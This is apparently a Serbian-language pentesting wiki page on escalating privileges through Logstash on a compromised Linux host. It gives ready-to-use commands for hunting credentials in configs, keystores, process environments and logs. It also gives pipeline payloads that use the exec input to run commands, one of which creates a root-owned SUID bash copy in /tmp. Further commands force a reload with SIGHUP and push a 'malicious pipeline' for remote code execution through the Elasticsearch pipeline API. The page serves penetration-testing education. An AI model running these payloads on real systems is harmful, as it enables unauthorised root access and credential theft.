# Eskalacija privilegija u Logstash-u

{{#include ../../banners/hacktricks-training.md}}

## Logstash

Logstash se koristi za **prikupljanje, transformaciju i prosleđivanje logova** kroz sistem poznat kao **pipelines**. Ovi pipelines se sastoje od faza **input**, **filter** i **output**.<sup>[[4]](#references)</sup> Zanimljiv aspekt se javlja kada Logstash radi na kompromitovanoj mašini.

### Konfiguracija pipeline-a

Kod instalacija Debian i RPM paketa, pipelines se konfigurišu putem **/etc/logstash/pipelines.yml**, koji navodi lokacije konfiguracija za pipelines; druge distribucije smeštaju `pipelines.yml` u Logstash direktorijum `path.settings`.<sup>[[5]](#references)[[6]](#references)</sup>
```yaml
# Define your pipelines here. Multiple pipelines can be defined.
# For details on multiple pipelines, refer to the documentation:
# https://www.elastic.co/guide/en/logstash/current/multiple-pipelines.html

- pipeline.id: main
path.config: "/etc/logstash/conf.d/*.conf"
- pipeline.id: example
path.config: "/usr/share/logstash/pipeline/1*.conf"
pipeline.workers: 6
```
Ovaj fajl otkriva gde se nalaze **.conf** fajlovi koji sadrže konfiguracije za pipeline. Kada se koristi **Elasticsearch output**, proverite njegove postavke `user`/`password`, `cloud_auth` ili `api_key`; efektivne privilegije naloga zavise od Elasticsearch-a. Glob `path.config` učitava svaki fajl koji se podudara za dati pipeline.<sup>[[6]](#references)[[7]](#references)[[11]](#references)</sup>

Ako se Logstash pokrene sa `-f <directory>` umesto sa `pipelines.yml`, `-f` ima prednost i **svi fajlovi unutar tog direktorijuma se spajaju leksikografskim redosledom i parsiraju kao jedna konfiguracija**.<sup>[[6]](#references)[[7]](#references)</sup> Ovo stvara 2 napadačke posledice:

- Dodat fajl kao što je `000-input.conf` ili `zzz-output.conf` može promeniti način sastavljanja konačnog pipeline-a
- Neispravan fajl može prouzrokovati pad validacije objedinjene konfiguracije; tokom ponovnog učitavanja Logstash zadržava prethodni pipeline, zato validirajte payload-e pre oslanjanja na automatsko ponovno učitavanje.<sup>[[1]](#references)</sup>

### Brza enumeracija na kompromitovanom hostu

Na sistemu na kojem je Logstash instaliran, brzo proverite:
```bash
ps aux | grep -i logstash
systemctl cat logstash 2>/dev/null
cat /etc/logstash/pipelines.yml 2>/dev/null
cat /etc/logstash/logstash.yml 2>/dev/null
find /etc/logstash /usr/share/logstash -maxdepth 3 -type f \( -name '*.conf' -o -name 'logstash.yml' -o -name 'pipelines.yml' \) -ls
rg -n --hidden -S 'password|passwd|api[_-]?key|cloud_auth|ssl_keystore_password|truststore_password|user\s*=>|hosts\s*=>' /etc/logstash /usr/share/logstash 2>/dev/null
```
Proverite i da li je lokalni monitoring API dostupan. Podrazumevano se vezuje za **127.0.0.1:9600**, što je obično dovoljno nakon pristupa hostu.<sup>[[8]](#references)</sup>
```bash
curl -s http://127.0.0.1:9600/?pretty
curl -s http://127.0.0.1:9600/_node/pipelines?pretty
curl -s http://127.0.0.1:9600/_node/stats/pipelines?pretty
```
Ovi endpointi izlažu ID-jeve i podešavanja pipeline-ova, runtime metrike i brojače uspešnih/neuspešnih ponovnih učitavanja konfiguracije, što pomaže da se potvrdi da li je izmena prihvaćena.<sup>[[8]](#references)[[17]](#references)[[18]](#references)</sup>

Ako pronađeni credential cilja **Elasticsearch**, pogledajte [ovu drugu stranicu o Elasticsearch-u](../../network-services-pentesting/9200-pentesting-elasticsearch.md).

### Eskalacija privilegija putem pipeline-ova sa dozvolom upisa

Da biste pokušali eskalaciju privilegija, najpre utvrdite pod kojim user-om Logstash service zaista radi; nemojte pretpostaviti da je to root ili user **logstash**. Uverite se da ispunjavate **jedan** od sledećih kriterijuma:

- Imate **write access** nad **.conf** fajlom pipeline-a **ili**
- Fajl **/etc/logstash/pipelines.yml** koristi wildcard, a vi možete da upisujete u ciljnu fasciklu.<sup>[[6]](#references)[[7]](#references)</sup>

Pored toga, mora biti ispunjen **jedan** od sledećih uslova:

- Mogućnost restartovanja Logstash service-a **ili**
- U fajlu **/etc/logstash/logstash.yml** je podešeno **config.reload.automatic: true**.<sup>[[1]](#references)[[15]](#references)</sup>

Ako u konfiguraciji postoji wildcard, kreiranje fajla koji odgovara tom wildcard-u omogućava izvršavanje komandi.<sup>[[7]](#references)[[9]](#references)</sup> Na primer:
```bash
input {
exec {
command => "whoami"
interval => 120
}
}

output {
file {
path => "/tmp/output.log"
codec => rubydebug
}
}
```
Ovde **interval** određuje učestalost izvršavanja u sekundama. U datom primeru, komanda **whoami** se izvršava svakih 120 sekundi, a njen izlaz se upisuje u **/tmp/output.log**.<sup>[[9]](#references)</sup>

Uz **config.reload.automatic: true** u datoteci **/etc/logstash/logstash.yml**, Logstash će automatski detektovati i primeniti nove ili izmenjene pipeline konfiguracije bez potrebe za restartovanjem.<sup>[[1]](#references)[[15]](#references)</sup> Ako nema wildcard-a, postojeće konfiguracije se i dalje mogu menjati, ali je potreban oprez kako bi se izbegli prekidi u radu.

### Pouzdaniji Pipeline Payload-i

`exec` input plugin i dalje radi u aktuelnim izdanjima i zahteva ili `interval` ili `schedule`. On izvršava komandu tako što radi **fork** Logstash JVM-a, pa ako nema dovoljno memorije, vaš payload može da ne uspe sa greškom `ENOMEM` umesto da se neprimetno izvršava.<sup>[[9]](#references)</sup>

Kada servis ima dovoljne privilegije za kreiranje SUID datoteke u vlasništvu root-a, praktičan payload za eskalaciju privilegija je onaj koji ostavlja trajan artefakt:
```bash
input {
exec {
command => "cp /bin/bash /tmp/logroot && chown root:root /tmp/logroot && chmod 4755 /tmp/logroot"
interval => 300
}
}
output {
null {}
}
```
Ako nemate prava za restart, ali možete poslati signal procesu, Logstash takođe podržava ponovno učitavanje pokrenuto signalom **SIGHUP** na Unix-like sistemima:<sup>[[1]](#references)</sup>
```bash
kill -SIGHUP $(pgrep -f logstash)
```
Imajte na umu da nije svaki plugin pogodan za reload. Na primer, ulaz **stdin** sprečava automatsko ponovno učitavanje, zato nemojte pretpostaviti da će `config.reload.automatic` uvek preuzeti vaše izmene.<sup>[[1]](#references)</sup>

### Krađa tajni iz Logstash-a

Pre nego što se usredsredite samo na izvršavanje koda, prikupite podatke kojima Logstash već ima pristup:

- Credentiali se mogu pojaviti u izlazima `elasticsearch {}`, URL-ovima/podešavanjima za `http_poller`, JDBC ulazima ili podešavanjima povezanim sa cloud-om; ovi plugin-ovi izlažu polja sa credentialima koja vredi pretražiti.<sup>[[11]](#references)[[12]](#references)[[13]](#references)</sup>
- Secure settings mogu biti smeštena u **`/etc/logstash/logstash.keystore`** ili u drugom `path.settings` direktorijumu.<sup>[[5]](#references)[[10]](#references)</sup>
- Lozinka keystore-a može biti prosleđena kroz **`LOGSTASH_KEYSTORE_PASS`**, a RPM/DEB instalacije učitavaju service environment variables iz **`/etc/sysconfig/logstash`**.<sup>[[10]](#references)</sup>
- Proširivanje environment variables pomoću `${VAR}` rešava se pri pokretanju Logstash-a, zato vredi proveriti okruženje service-a.<sup>[[14]](#references)</sup>

Korisne provere:
```bash
ls -l /etc/logstash /etc/logstash/logstash.keystore 2>/dev/null
strings /etc/logstash/conf.d/*.conf 2>/dev/null | head
tr '\0' '\n' < /proc/$(pgrep -o -f logstash)/environ 2>/dev/null | sort
cat /etc/sysconfig/logstash 2>/dev/null
journalctl -u logstash --no-pager 2>/dev/null | tail -n 200
ls -lah /var/log/logstash 2>/dev/null
```
Ovo takođe vredi proveriti zato što je **CVE-2023-46672** pokazao da je, pod određenim okolnostima, Logstash beležio osetljive informacije u svojim logovima, uključujući secrets sačuvane u njegovom keystore-u i referencirane iz konfiguracije; pregledajte stare Logstash logove i `journald` unose ako se te okolnosti mogu primeniti.<sup>[[3]](#references)</sup>

### Zloupotreba centralizovanog upravljanja pipeline-ovima

U nekim okruženjima host se uopšte **ne oslanja na lokalne `.conf` datoteke**. Ako je podešeno **`xpack.management.enabled: true`**, Logstash može da preuzima centralno upravljane pipeline-ove iz Elasticsearch/Kibana, a nakon omogućavanja ovog režima lokalne konfiguracije pipeline-ova više nisu izvor istine.<sup>[[2]](#references)</sup>

To znači da postoji drugačiji attack path:

1. Pronađite Elastic credentials u lokalnim Logstash podešavanjima, keystore-u ili logovima.<sup>[[3]](#references)[[10]](#references)</sup>
2. Proverite da li nalog ima **`manage_logstash_pipelines`** cluster privilege.<sup>[[16]](#references)</sup>
3. Kreirajte ili zamenite centralno upravljani pipeline tako da Logstash host izvrši vaš payload tokom sledećeg intervala provere.<sup>[[2]](#references)[[16]](#references)</sup>

Elasticsearch API koji se koristi za ovu funkciju je:<sup>[[16]](#references)</sup>
```bash
curl -X PUT http://ELASTIC:9200/_logstash/pipeline/pwned \
-H 'Content-Type: application/json' \
-u user:password \
-d '{
"description": "malicious pipeline",
"last_modified": "2026-01-02T02:50:51.250Z",
"username": "user",
"pipeline": "input { exec { command => \"id > /tmp/.ls-rce\" interval => 120 } } output { null {} }",
"pipeline_metadata": {"type": "logstash_pipeline", "version": "1"},
"pipeline_settings": {
"pipeline.workers": 1,
"pipeline.batch.size": 1,
"pipeline.batch.delay": 50,
"queue.type": "memory",
"queue.max_bytes": "1gb",
"queue.checkpoint.writes": 1024
}
}'
```
Ovo je posebno korisno kada su lokalne datoteke samo za čitanje, ali je Logstash već registrovan za udaljeno preuzimanje pipeline-ova.<sup>[[2]](#references)[[16]](#references)</sup>

## References

- [1] [Elastic Docs: Ponovno učitavanje konfiguracione datoteke](https://www.elastic.co/guide/en/logstash/8.19/reloading-config.html)
- [2] [Elastic Docs: Konfigurisanje centralizovanog upravljanja pipeline-ovima](https://www.elastic.co/guide/en/logstash/8.19/configuring-centralized-pipelines.html)
- [3] [Logstash 8.11.1 Security Update (ESA-2023-26) - CVE-2023-46672](https://discuss.elastic.co/t/logstash-8-11-1-security-update-esa-2023-26/347191)
- [4] [Elastic Docs: Kreiranje Logstash pipeline-a](https://www.elastic.co/docs/reference/logstash/creating-logstash-pipeline)
- [5] [Elastic Docs: Struktura Logstash direktorijuma](https://www.elastic.co/docs/reference/logstash/dir-layout)
- [6] [Elastic Docs: Višestruki pipeline-ovi](https://www.elastic.co/docs/reference/logstash/multiple-pipelines)
- [7] [Elastic Docs: Pokretanje Logstash-a iz komandne linije](https://www.elastic.co/docs/reference/logstash/running-logstash-command-line)
- [8] [Elastic Docs: Nadgledanje Logstash-a pomoću API-ja](https://www.elastic.co/docs/reference/logstash/monitoring-logstash)
- [9] [Elastic Docs: Exec input plugin](https://www.elastic.co/docs/reference/logstash/plugins/plugins-inputs-exec)
- [10] [Elastic Docs: Secrets keystore za bezbedna podešavanja](https://www.elastic.co/docs/reference/logstash/keystore)
- [11] [Elastic Docs: Elasticsearch output plugin](https://www.elastic.co/docs/reference/logstash/plugins/plugins-outputs-elasticsearch)
- [12] [Elastic Docs: Http_poller input plugin](https://www.elastic.co/docs/reference/logstash/plugins/plugins-inputs-http_poller)
- [13] [Elastic Docs: Jdbc input plugin](https://www.elastic.co/docs/reference/logstash/plugins/plugins-inputs-jdbc)
- [14] [Elastic Docs: Korišćenje promenljivih okruženja](https://www.elastic.co/docs/reference/logstash/environment-variables)
- [15] [Elastic Docs: logstash.yml](https://www.elastic.co/docs/reference/logstash/logstash-settings-file)
- [16] [Elasticsearch API: Kreiranje ili ažuriranje Logstash pipeline-a](https://www.elastic.co/docs/api/doc/elasticsearch/operation/operation-logstash-put-pipeline)
- [17] [Logstash API: Dobijanje podešavanja za pipeline-ove](https://www.elastic.co/docs/api/doc/logstash/operation/operation-nodeinfopipelines)
- [18] [Logstash API: Dobijanje statistike za pipeline-ove](https://www.elastic.co/docs/api/doc/logstash/operation/operation-nodestatspipelines)
{{#include ../../banners/hacktricks-training.md}}
